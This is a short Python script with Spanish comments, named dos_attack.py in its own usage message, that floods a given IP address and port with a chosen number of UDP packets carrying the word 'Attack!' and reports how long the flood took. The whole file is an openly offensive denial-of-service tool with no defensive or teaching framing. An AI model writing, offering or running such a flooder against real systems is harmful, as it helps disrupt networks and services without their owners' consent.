import sys
import socket
import time

def main():
    # Verifica que se reciban exactamente 3 argumentos (IP, puerto y cantidad de solicitudes)
    if len(sys.argv) != 4:
        print("Uso: python dos_attack.py <IP> <puerto> <cantidad_solicitudes>")
        sys.exit(1)

    # Asigna los argumentos a variables
    ip = sys.argv[1]
    puerto = int(sys.argv[2])
    
    # Intenta convertir la cantidad de solicitudes a un entero
    try:
        cantidad_solicitudes = int(sys.argv[3])
    except ValueError:
        print("La cantidad de solicitudes debe ser un número entero.")
        sys.exit(1)

    # Inicializa el socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    mensaje = b'Attack!' 

    # Captura el tiempo de inicio
    tiempo_inicio = time.time()

    # Envía las solicitudes
    for i in range(cantidad_solicitudes):
        sock.sendto(mensaje, (ip, puerto))
        print(f"Solicitud {i + 1} enviada a {ip}:{puerto}")

    # Captura el tiempo de finalización
    tiempo_final = time.time()

    # Calcula el tiempo total transcurrido
    tiempo_total = tiempo_final - tiempo_inicio

    # Mensaje final
    print(f"Total de solicitudes enviadas: {cantidad_solicitudes}")
    print(f"Tiempo total del ataque: {tiempo_total:.2f} segundos")

if __name__ == "__main__":
    main()
